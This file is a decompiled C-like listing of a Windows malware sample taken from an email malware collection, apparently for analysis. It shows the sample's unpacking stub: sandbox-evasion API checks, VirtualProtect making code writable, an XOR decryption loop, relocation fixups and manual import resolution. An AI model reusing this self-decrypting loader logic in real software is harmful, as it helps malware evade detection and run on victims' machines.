// subject.c
// Generated on 5/4/2015 1:13:07 AM by decompiling malware_via_email/malware_0463/ia32_pe/subject.exe
// using Decompiler version 0.4.2.0.

#include "subject.h"

void fn00401000(word32 eax, word32 ebp, word32 esi, word32 edi)
{
fn00401000_entry:
l00401000:
	call SHLWAPI.dll!StrStrIA (retsize: 4; depth: 40)
	word32 esi_152 = 0x00000000
	word32 dwLoc14_16 = 0x000000E8
	word32 ebx_17 = 0x00000017
	branch eax == 0x00000000 l0040102A
l00401022:
	return
l0040102A:
	branch AddUsersToEncryptedFile(0x00000000, 0x00000000) != 0x00000000 l00401039
l00401038:
	return
l00401039:
	Mem52[fp - 0x00000028:word32] = 0xFFFFFFFF
	Mem54[fp - 0x0000002C:word32] = 0xFFFFFFFF
	word32 eax_55 = AreAllAccessesGranted(0x00000000, 0x00000000)
	branch eax_55 != 0x00000000 l0040104A
l00401047:
	ebx_17 = eax_55 + 0x00000019
l0040104A:
	Mem63[fp - 0x00000028:word32] = ebp
	Mem66[fp - 0x0000002C:word32] = edi
	VirtualProtect(0x00401000, 0x00003000, 0x00000040, fp - 0x00000018)
	word32 eax_149 = 0x00000000
l00401070:
	branch esi_152 != ebx_17 l00401076
l00401074:
	esi_152 = 0x00000000
l00401076:
	Mem104[eax_149 + 0x00401678:byte] = Mem66[esi_152 + 0x00404000:byte] ^ Mem66[eax_149 + 0x00401678:byte] ^ 0xAA
	word32 esi_100 = esi_152 + 0x00000001
	branch esi_100 != ebx_17 l00401094
l00401092:
	esi_100 = 0x00000000
l00401094:
	Mem114[eax_149 + 0x00401679:byte] = Mem104[esi_100 + 0x00404000:byte] ^ Mem104[eax_149 + 0x00401679:byte] ^ 0xAA
	word32 esi_110 = esi_100 + 0x00000001
	branch esi_110 != ebx_17 l004010B2
l004010B0:
	esi_110 = 0x00000000
l004010B2:
	Mem124[eax_149 + 0x0040167A:byte] = Mem114[esi_110 + 0x00404000:byte] ^ Mem114[eax_149 + 0x0040167A:byte] ^ 0xAA
	word32 esi_120 = esi_110 + 0x00000001
	branch esi_120 != ebx_17 l004010D0
l004010CE:
	esi_120 = 0x00000000
l004010D0:
	Mem134[eax_149 + 0x0040167B:byte] = Mem124[esi_120 + 0x00404000:byte] ^ Mem124[eax_149 + 0x0040167B:byte] ^ 0xAA
	word32 esi_130 = esi_120 + 0x00000001
	branch esi_130 != ebx_17 l004010EE
l004010EC:
	esi_130 = 0x00000000
l004010EE:
	Mem144[eax_149 + 0x0040167C:byte] = Mem134[esi_130 + 0x00404000:byte] ^ Mem134[eax_149 + 0x0040167C:byte] ^ 0xAA
	word32 esi_140 = esi_130 + 0x00000001
	branch esi_140 != ebx_17 l0040110C
l0040110A:
	esi_140 = 0x00000000
l0040110C:
	eax_149 = eax_149 + 0x00000006
	Mem151[eax_149 + 0x00401677:byte] = Mem144[esi_140 + 0x00404000:byte] ^ Mem144[eax_149 + 0x0040167D:byte] ^ 0xAA
	esi_152 = esi_140 + 0x00000001
	branch eax_149 <u 0x00001440 l00401070
l00401132:
	Mem156[fp - 0x0000001C:word32] = 0x00000000
	Mem166[fp - 0x00000014:word32] = 0x00000000
	word32 ecx_159 = 0x00402978
	branch false l004011BB
l00401162:
	word32 eax_339 = Mem166[ecx_159 + 0x00000004:word32] - 0x00000008 >>u 0x00000001
	word32 edx_342 = ecx_159 + 0x00000008
	branch eax_339 <= 0x00000000 l004011A6
l00401174:
	word32 ebx_363 = eax_339
l00401180:
	word32 eax_367 = (word32) Mem166[edx_342 + 0x00000000:word16]
	branch (eax_367 & 0x0000F000) != 0x00003000 l0040119E
l00401193:
	word32 eax_379 = (eax_367 & 0x00000FFF) + Mem166[ecx_159 + 0x00000000:word32]
	Mem382[eax_379 + 0x004013F8:word32] = Mem166[eax_379 + 0x004013F8:word32] + 0xF04013F8
l0040119E:
	edx_342 = edx_342 + 0x00000002
	ebx_363 = ebx_363 - 0x00000001
	branch ebx_363 != 0x00000000 l00401180
l004011A6:
	word32 eax_348 = Mem166[ecx_159 + 0x00000004:word32]
	word32 edx_350 = dwLoc14_16 + eax_348
	word32 ecx_351 = ecx_159 + eax_348
	branch edx_350 <u 0x00000000 l00401162
	word32 eax_355 = Mem166[ecx_351 + 0x00000004:word32]
	word32 edx_357 = edx_350 + eax_355
	ecx_159 = ecx_351 + eax_355
	dwLoc14_16 = edx_357
	branch edx_357 <u 0x00000000 l00401162
l004011BB:
	branch Mem166[0x0040217C:word32] == 0x00000000 l00401251
	branch Mem166[0x0040217C:word32] == 0x00000000 l00401251
	word32 ebx_186 = 0x0040216C
	word32 dwLoc14_187 = 0x0040216C
	ebx_209 = ebx_186
	branch Mem166[0x0040217C:word32] == 0x00000000 l00401251
l004011D2:
	word32 ebx_209
	branch LoadLibraryA(Mem166[ebx_209 + 0x0000000C:word32] + 0x004013F8) == 0x00000000 l00401244
	branch LoadLibraryA(Mem166[ebx_209 + 0x0000000C:word32] + 0x004013F8) == 0x00000000 l00401244
	word32 eax_235 = LoadLibraryA(Mem166[ebx_209 + 0x0000000C:word32] + 0x004013F8)
	word32 ecx_237 = eax_235
	branch eax_235 == 0x00000000 l00401244
l004011EB:
	branch Mem166[ebx_209 + 0x00000000:word32] != 0x00000000 l004011F4
	branch Mem166[ebx_209 + 0x00000000:word32] != 0x00000000 l004011F4
	word32 ebp_268 = Mem166[ebx_209 + 0x00000000:word32]
	branch ebp_268 != 0x00000000 l004011F4
l004011F1:
	ebp_268 = Mem166[ebx_209 + 0x00000010:word32]
l004011F4:
	word32 eax_274 = Mem166[ebp_268 + 0x004013F8:word32]
	word32 ebp_275 = ebp_268 + 0x004013F8
	word32 esi_276 = Mem166[ebx_209 + 0x00000010:word32] + 0x004013F8
	branch eax_274 == 0x00000000 l00401244
l00401203:
	goto l00401209
l00401205:
	ecx_237 = eax_235
l00401209:
	word32 eax_298
	branch eax_274 >= 0x00000000 l0040121E
l0040120D:
	eax_298 = GetProcAddress(ecx_237, (word32) Mem166[ebp_275 + 0x00000000:word16])
	goto l0040122A
l0040121E:
	eax_298 = GetProcAddress(ecx_237, eax_274 + 0x004013FA)
l0040122A:
	Mem301[esi_276 + 0x00000000:word32] = eax_298
	ebp_275 = ebp_275 + 0x00000004
	eax_274 = Mem301[ebp_275 + 0x00000000:word32]
	esi_276 = esi_276 + 0x00000004
	branch eax_274 != 0x00000000 l00401205
l00401240:
	ebx_209 = dwLoc14_187
l00401244:
	ebx_209 = ebx_209 + 0x00000014
	dwLoc14_187 = ebx_209
	branch Mem166[ebx_209 + 0x00000010:word32] != 0x00000000 l004011D2
l00401251:
	call 0x00401E58 (retsize: 4; depth: 48)
	ExitProcess(0x00000000)
fn00401000_exit:
}

